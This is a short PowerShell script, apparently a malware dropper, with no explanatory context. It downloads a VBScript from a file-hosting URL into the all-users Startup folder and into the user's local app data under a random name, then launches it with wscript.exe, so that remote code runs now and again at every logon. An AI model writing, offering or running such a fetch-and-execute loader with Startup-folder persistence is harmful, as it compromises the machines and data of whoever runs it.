$url = "https://files.catbox.moe/xjgbuj.vbs"

$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"

$localAppData = $env:LOCALAPPDATA
$destination2 = Join-Path $localAppData "9lepqn.vbs"

# Download the file to both locations
Invoke-WebRequest -Uri $url -OutFile $destination1
Invoke-WebRequest -Uri $url -OutFile $destination2

# Run the VBScript from Startup folder location
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination1`"" -NoNewWindow 

exit
